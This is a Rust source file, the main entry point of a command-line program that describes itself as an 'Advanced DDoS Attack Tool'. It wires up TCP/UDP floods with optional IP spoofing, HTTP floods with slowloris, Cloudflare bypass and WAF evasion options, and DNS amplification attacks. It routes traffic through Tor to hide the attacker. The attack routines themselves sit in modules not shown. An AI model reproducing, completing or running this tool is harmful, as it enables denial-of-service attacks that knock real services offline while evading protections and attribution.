use clap::{Parser, Subcommand};
use colored::*;
use log::info;
use std::net::IpAddr;
use std::time::Duration;

mod attacks;
mod network;
mod tor;
mod utils;
mod evasion;
mod amplification;

use attacks::{layer4, layer7};
use tor::TorClient;
use utils::{banner, logger, input};

#[derive(Parser)]
#[command(name = "ddos-attack")]
#[command(about = "Advanced DDoS Attack Tool written in Rust")]
#[command(version = "1.0.0")]
#[command(author = "KARTHIK-LAL")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Layer 4 TCP/UDP flood attacks
    Layer4 {
        /// Target IP addresses (comma separated)
        #[arg(short, long)]
        targets: String,
        
        /// Target ports (comma separated)
        #[arg(short, long, default_value = "80,443")]
        ports: String,
        
        /// Attack protocol (tcp/udp)
        #[arg(long, default_value = "tcp")]
        protocol: String,
        
        /// Number of threads
        #[arg(long, default_value = "100")]
        threads: u32,
        
        /// Packet size in bytes
        #[arg(long, default_value = "1024")]
        size: usize,
        
        /// Rate limit (packets per second)
        #[arg(long, default_value = "1000")]
        rate: u64,
    },
    
    /// Layer 7 HTTP/HTTPS flood attacks
    Layer7 {
        /// Target URLs (comma separated)
        #[arg(short, long)]
        targets: String,
        
        /// Number of threads
        #[arg(long, default_value = "50")]
        threads: u32,
        
        /// Requests per second
        #[arg(long, default_value = "100")]
        rate: u64,
        
        /// Custom User-Agent
        #[arg(long, default_value = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")]
        user_agent: String,
        
        /// HTTP method (GET/POST)
        #[arg(long, default_value = "GET")]
        method: String,
        
        /// Enable slowloris attack
        #[arg(long)]
        slowloris: bool,
        
        /// Enable Cloudflare bypass
        #[arg(long)]
        cloudflare_bypass: bool,
        
        /// Enable WAF evasion
        #[arg(long)]
        waf_evasion: bool,
        
        /// Randomize User-Agent
        #[arg(long)]
        random_useragent: bool,
    },
    
    /// DNS Amplification attacks
    DnsAmp {
        /// Target IP address
        #[arg(short, long)]
        target: String,
        
        /// Domain to query
        #[arg(long, default_value = "google.com")]
        domain: String,
        
        /// Number of threads
        #[arg(long, default_value = "10")]
        threads: u32,
        
        /// Queries per second
        #[arg(long, default_value = "100")]
        rate: u64,
        
        /// Attack duration in seconds
        #[arg(long, default_value = "60")]
        duration: u64,
    },
    
    /// Start Tor service
    Tor {
        /// Start Tor daemon
        #[arg(long)]
        start: bool,
        
        /// Stop Tor daemon
        #[arg(long)]
        stop: bool,
        
        /// Renew Tor identity
        #[arg(long)]
        renew: bool,
    },
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Initialize logger
    logger::init();
    
    // Display banner
    banner::display();
    
    let cli = Cli::parse();
    
    match cli.command {
        Commands::Layer4 {
            targets,
            ports,
            protocol,
            threads,
            size,
            rate,
        } => {
            info!("Starting Layer 4 attack");
            
            // Ask user for Tor usage
            let use_tor = input::ask_for_tor();
            
            // Ask user for IP spoofing (only for UDP)
            let use_spoofing = if protocol == "udp" {
                input::ask_for_spoofing()
            } else {
                false
            };
            
            // Start Tor if requested
            if use_tor {
                println!("{}", "🔄 Starting Tor service...".bright_blue());
                let mut tor_client = TorClient::new().await?;
                if let Err(e) = tor_client.start().await {
                    eprintln!("{}", format!("Failed to start Tor: {}", e).red());
                    std::process::exit(1);
                }
                println!("{}", "✅ Tor service started successfully!".bright_green());
                tokio::time::sleep(Duration::from_secs(5)).await; // Wait for Tor to initialize
            }
            
            let target_ips: Vec<IpAddr> = targets
                .split(',')
                .map(|s| s.trim().parse())
                .collect::<Result<Vec<_>, _>>()?;
                
            let target_ports: Vec<u16> = ports
                .split(',')
                .map(|s| s.trim().parse())
                .collect::<Result<Vec<_>, _>>()?;
            
            let config = layer4::AttackConfig {
                targets: target_ips,
                ports: target_ports,
                threads,
                packet_size: size,
                rate_limit: Duration::from_millis(1000 / rate),
                use_spoofing,
                use_tor,
            };
            
            match protocol.as_str() {
                "tcp" => layer4::tcp_flood(config).await?,
                "udp" => layer4::udp_flood(config).await?,
                _ => {
                    eprintln!("{}", "Invalid protocol. Use 'tcp' or 'udp'".red());
                    std::process::exit(1);
                }
            }
        }
        
        Commands::Layer7 {
            targets,
            threads,
            rate,
            user_agent,
            method,
            slowloris,
            cloudflare_bypass,
            waf_evasion,
            random_useragent,
        } => {
            info!("Starting Layer 7 attack");
            
            // Ask user for Tor usage
            let use_tor = input::ask_for_tor();
            
            // Start Tor if requested
            if use_tor {
                println!("{}", "🔄 Starting Tor service...".bright_blue());
                let mut tor_client = TorClient::new().await?;
                if let Err(e) = tor_client.start().await {
                    eprintln!("{}", format!("Failed to start Tor: {}", e).red());
                    std::process::exit(1);
                }
                println!("{}", "✅ Tor service started successfully!".bright_green());
                tokio::time::sleep(Duration::from_secs(5)).await; // Wait for Tor to initialize
            }
            
            let target_urls: Vec<String> = targets
                .split(',')
                .map(|s| s.trim().to_string())
                .collect();
            
            let config = layer7::AttackConfig {
                targets: target_urls,
                threads,
                rate_limit: Duration::from_millis(1000 / rate),
                user_agent: if random_useragent {
                    // Use random user agent from database
                    let ua_db = evasion::useragent::UserAgentDatabase::new();
                    ua_db.get_random()
                } else {
                    user_agent
                },
                method,
                use_tor,
                slowloris,
                cloudflare_bypass,
                waf_evasion,
            };
            
            layer7::http_flood(config).await?;
        }
        
        Commands::DnsAmp {
            target,
            domain,
            threads,
            rate,
            duration,
        } => {
            info!("Starting DNS Amplification attack");
            
            let target_ip = target.parse()?;
            let attack_duration = Duration::from_secs(duration);
            
            println!("{}", format!("🎯 Target: {}", target).bright_cyan());
            println!("{}", format!("🌐 Domain: {}", domain).bright_cyan());
            println!("{}", format!("🧵 Threads: {}", threads).bright_cyan());
            println!("{}", format!("⚡ Rate: {} queries/sec", rate).bright_cyan());
            println!("{}", format!("⏱️  Duration: {}s", duration).bright_cyan());
            
            let dns_amp = amplification::dns::DnsAmplification::new();
            dns_amp.launch_attack(target_ip, &domain, threads, rate, attack_duration).await?;
        }
        
        Commands::Tor { start, stop, renew } => {
            let mut tor_client = TorClient::new().await?;
            
            if start {
                tor_client.start().await?;
                println!("{}", "Tor service started".green());
            }
            
            if stop {
                tor_client.stop().await?;
                println!("{}", "Tor service stopped".green());
            }
            
            if renew {
                tor_client.renew_identity().await?;
                println!("{}", "Tor identity renewed".green());
            }
        }
    }
    
    Ok(())
}
